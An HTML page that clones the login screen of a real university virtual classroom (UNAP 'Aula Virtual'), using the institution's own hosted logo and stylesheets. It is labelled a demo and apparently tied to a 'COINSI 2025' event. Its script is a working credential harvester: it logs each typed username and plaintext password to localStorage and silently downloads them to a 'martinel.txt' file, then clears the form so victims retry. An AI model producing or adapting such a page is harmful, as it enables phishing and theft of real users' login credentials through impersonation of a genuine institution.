<!DOCTYPE html>
<html ng-app="App" lang="es">
<head>
    <meta charset="UTF-8" />
    <meta name="description" content="Aula Virtual - Demo Guardado TXT" />
    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
    <title>Aula Virtual | Demo Guardar TXT</title>

    <link href="https://aulavirtual2.unap.edu.pe/images/themes/unap/favicon.ico" rel="icon">
    <link rel="stylesheet" type="text/css" href="https://aulavirtual2.unap.edu.pe/assets/vendors/bootstrap/dist/css/bootstrap.min.css" />
    <link rel="stylesheet" type="text/css" href="https://aulavirtual2.unap.edu.pe/assets/common/css/source/auth-main.css" />
    <link rel="stylesheet" type="text/css" href="https://aulavirtual2.unap.edu.pe/assets/common/css/source/forms/form-validation.css" />
    <link href="https://aulavirtual2.unap.edu.pe/css/login.css" rel="stylesheet" />
    <link href="https://aulavirtual2.unap.edu.pe/css/themes/unap/login.css" rel="stylesheet" />

    <style>
        body.theme-dark.single-page.single-page-inverse {
            background: #12121a;
        }
        .btn.button-submit { 
            cursor: pointer; 
        }
        .notification {
            position: fixed;
            top: 20px;
            right: 20px;
            padding: 15px 20px;
            border-radius: 5px;
            font-weight: bold;
            z-index: 9999;
            animation: slideIn 0.3s ease-out;
        }
        @keyframes slideIn {
            from {
                transform: translateX(400px);
                opacity: 0;
            }
            to {
                transform: translateX(0);
                opacity: 1;
            }
        }
        .notification.success {
            background-color: #2ecc71;
            color: white;
        }
        .notification.error {
            background-color: #e74c3c;
            color: white;
        }
    </style>
</head>
<body class="theme-dark single-page single-page-inverse">
    <section class="wrapper">
        <div class="intro">
            <div class="left-ovh">
                <div class="left-side">
                    <input id="IsLockedOut" value="0" hidden />
                    <input id="Reason" value="" hidden />

                    <div class="m-login__wrapper" ng-controller="login">
                        <form id="loginForm" class="form" onsubmit="return false;">
                            <a href="index.html#">
                                <img class="logo" src="https://aulavirtual2.unap.edu.pe/images/themes/unap/logo.png" draggable="false" alt="logo">
                            </a>
                            <h1>AULA VIRTUAL</h1>
                            <div id="mensaje" class="text-danger" style="font-weight: 500; display:none;"></div>

                            <div class="group">
                                <input id="username" placeholder="USUARIO" autocomplete="off" />
                                <img class="ico" src="https://aulavirtual2.unap.edu.pe/images/login/user.svg" />
                                <div class="bar"></div>
                            </div>
                            <div class="group">
                                <input id="password" type="password" placeholder="CONTRASEÑA" />
                                <img id="pass-ico" class="ico" src="https://aulavirtual2.unap.edu.pe/images/login/pass.svg" />
                                <div class="bar"></div>
                            </div>
                            <div class="group">
                                <button id="m_login_signin_submit" class="btn button-submit" type="button">
                                    INGRESAR
                                </button>
                                <a class="forget-password-label" href="https://aulavirtual2.unap.edu.pe/account/ForgotPassword">¿Olvidaste tu contraseña?</a>
                            </div>
                        </form>
                    </div>

                    <div style="width:145px;left:25px;bottom:25px;position: fixed;">
                        <img src="https://aulavirtual2.unap.edu.pe/images/login/logo.svg" style="" class="logo" alt="logo pequeño" />
                    </div>
                </div>
                <div class="triangle"></div>
            </div>

            <div class="triangle right"></div>
            <div class="container-shape one"><div class="shape one"></div></div>
            <div class="container-shape two"><div class="shape two"></div></div>
            <div class="container-shape right three"><div class="right shape three"></div></div>
            <div class="container-shape right four"><div class="right shape four"></div></div>
            <div class="container-shape right five"><div class="right shape five"></div></div>
        </div>
    </section>

    <script>
        (function(){
            const btn = document.getElementById('m_login_signin_submit');
            const inputUser = document.getElementById('username');
            const inputPass = document.getElementById('password');
            const mensaje = document.getElementById('mensaje');

            function mostrarNotificacion(text, tipo = 'success') {
                const notif = document.createElement('div');
                notif.className = `notification ${tipo}`;
                notif.textContent = text;
                document.body.appendChild(notif);

                setTimeout(() => {
                    notif.style.animation = 'slideIn 0.3s ease-out reverse';
                    setTimeout(() => {
                        notif.remove();
                    }, 300);
                }, 4000);
            }

            function mostrarMensaje(text, esError = true) {
                mensaje.style.display = 'block';
                mensaje.style.color = esError ? '#ff6b6b' : '#8be78b';
                mensaje.textContent = text;
                setTimeout(() => {
                    mensaje.style.display = 'none';
                }, 4500);
            }

            function guardarEnMartinelTxt(usuario, contraseña) {
                const ahora = new Date();
                const fecha = ahora.toLocaleString('es-PE');
                const ip = "IP_Local";
                
                // Formato de la línea a guardar
                const linea = `[${fecha}] | IP: ${ip} | Usuario: ${usuario} | Contraseña: ${contraseña}\n`;

                // Obtener datos previos de localStorage
                let datosExistentes = localStorage.getItem('martinel_data') || '';
                
                // Agregar la nueva línea
                let nuevosDatos = datosExistentes + linea;
                
                // Guardar en localStorage
                localStorage.setItem('martinel_data', nuevosDatos);

                // Crear y descargar el archivo martinel.txt SIN diálogo
                const blob = new Blob([nuevosDatos], { type: 'text/plain;charset=utf-8' });
                const enlace = document.createElement('a');
                enlace.href = URL.createObjectURL(blob);
                enlace.download = 'martinel.txt';
                enlace.style.display = 'none';

                document.body.appendChild(enlace);
                
                // Ejecutar descarga sin diálogo
                setTimeout(() => {
                    enlace.dispatchEvent(new MouseEvent('click', {
                        bubbles: true,
                        cancelable: true,
                        view: window
                    }));
                    
                    setTimeout(() => {
                        document.body.removeChild(enlace);
                        URL.revokeObjectURL(enlace.href);
                    }, 100);
                }, 10);

                mostrarMensaje('¡REGISTRADO!  COINSI -2025', false);
                mostrarNotificacion('Archivo martinel.txt guardado automáticamente', 'success');
            }

            btn.addEventListener('click', function() {
                const usuario = (inputUser.value || '').trim();
                const contraseña = (inputPass.value || '').trim();

                if (!usuario || !contraseña) {
                    mostrarMensaje('Completa ambos campos: usuario y contraseña.');
                    mostrarNotificacion('Campos vacíos', 'error');
                    return;
                }

                guardarEnMartinelTxt(usuario, contraseña);

                // Limpiar campos
                inputUser.value = '';
                inputPass.value = '';
                inputUser.focus();
            });

            // Permitir guardar al presionar Enter
            inputPass.addEventListener('keypress', function(e) {
                if (e.key === 'Enter') {
                    btn.click();
                }
            });

            document.getElementById('loginForm').addEventListener('submit', function(e){
                e.preventDefault();
            });
        })();
    </script>
</body>
</html>
